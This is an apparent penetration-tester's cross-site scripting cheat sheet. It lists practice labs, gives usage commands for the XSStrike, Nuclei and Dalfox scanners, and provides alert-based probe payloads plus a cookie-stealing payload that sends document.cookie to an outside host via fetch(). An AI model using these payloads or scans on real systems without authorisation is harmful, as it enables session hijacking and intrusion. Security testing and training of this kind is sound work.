---
description: Cross-site scripting cheat sheet
---

# XSS

Cross-site scripting (XSS) remains one of the common vulnerabilities that threaten web applications to this day. XSS attacks rely on injecting a malicious script in a benign website to run on a user’s browser.

### Playground

* [https://tryhackme.com/r/room/axss](https://tryhackme.com/r/room/axss)
* [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php)
* [https://xss-labs.abay.sh/xss/](https://xss-labs.abay.sh/xss/)

### Tools

**XSStrike**

XSStrike is a Cross Site Scripting detection suite equipped with four hand written parsers, an intelligent payload generator, a powerful fuzzing engine and an incredibly fast crawler.

* [https://github.com/s0md3v/XSStrike](https://github.com/s0md3v/XSStrike)

{% code overflow="wrap" %}
```bash
# Install
git clone https://github.com/s0md3v/XSStrike
cd XSStrike
python3 -m venv xsstrike_env
source xsstrike_env/bin/activate
pip3 install -r requirements.txt

# run
python3 xsstrike.py -u "https://brutelogic.com.br/xss.php?a=fuzz" --fuzzer
python3 xsstrike.py -u "https://brutelogic.com.br/xss.php" --crawl -l 3
python3 xsstrike.py -u "https://brutelogic.com.br/xss.php?a=fuzz" --file xss.txt
```
{% endcode %}

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj6vjZhXx_XMXjyfIXlDcQ3olR_mJFJ9vyJkDZqUOYNnQCzWDGUce_pb9cGm-TB4wN8g2RChnbB9DOY6ktcPmhpdAa2YNp4sdZKLcYpWKy_-WVCJCnAzvLsT4lhmWRRbVWPYQM9GIYEb0vWxgs92zbVWWtZnZerrO9NsErx2te4t_x4rz9pMxvWNXQetrw/s955/xsstrike.png" alt=""><figcaption><p>XSStrike</p></figcaption></figure>

**Nuclei**

Nuclei has some cool XSS detection template that can be used to hunt low hanging fruit XSS.

{% code overflow="wrap" %}
```bash
nuclei -u "https://brutelogic.com.br/xss.php?a=" -tags xss
```
{% endcode %}

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKsc7jaQE8ZSpeD6GKn80EHz74yUCi4kYhDz9cvS3gyxFa42vuwwVRQWWHPdEh6CJ5t_eY2rqml331wuze62eDs7-1DFqkVO8B21XW9z1spp8AfCYyFILb7F2rGlE8JobvylS_qMAYM5ou_Ak9swAkjA1nOf5_Pe8LJV2m4MgOIw-HT4kTOg9TRzsQaBs/s1195/xss%20nuclei.png" alt=""><figcaption><p>Nuclei XSS</p></figcaption></figure>

**Dalfox**

DalFox is a powerful open-source tool that focuses on automation, making it ideal for quickly scanning for XSS flaws and analyzing parameters. Its advanced testing engine and niche features are designed to streamline the process of detecting and verifying vulnerabilities.

* [https://github.com/hahwul/dalfox](https://github.com/hahwul/dalfox)

Usage:

{% code overflow="wrap" %}
```bash
# basic scan
dalfox url https://brutelogic.com.br/xss.php

# scan with custom payload
dalfox url https://brutelogic.com.br/xss.php --custom-payload xss-payload.txt --skip-bav --only-custom-payload
```
{% endcode %}

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEggKvGxnkyI8R8QbZHtRDE7WYJkzhL1UcdB8LQYOK4iB54OFu0pC0OCcCEAjqWRq22Jx7ps2c-clA2GGUehA9IZ3cJwcx0NJ4yPLAP6VaV1R2m9kAed6VNdU8lcZVcxx7mLmnnXAGnf3PlxcAGTYXXVEYAOmM3j0YIjJHk6i5sIGcsXqEKjdtXJy7hGqDA/s923/dalfox.png" alt=""><figcaption><p><strong>Dalfox</strong></p></figcaption></figure>

### Simple Payload

This is a simple payload that I commonly use for XSS testing.

{% code overflow="wrap" %}
```javascript
" autofocus onfocus=alert(document.domain) x="
"/><img src=x onerror=alert(document.domain) />
```
{% endcode %}

For Cookie Stealing

{% code overflow="wrap" %}
```javascript
<img src="x" onerror="fetch('http://10.10.1.3:8000?c=' + encodeURIComponent(document.cookie))">
```
{% endcode %}

### Resources

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
* [https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
* [https://raw.githubusercontent.com/carlospolop/Auto\_Wordlists/main/wordlists/xss.txt](https://raw.githubusercontent.com/carlospolop/Auto\_Wordlists/main/wordlists/xss.txt)
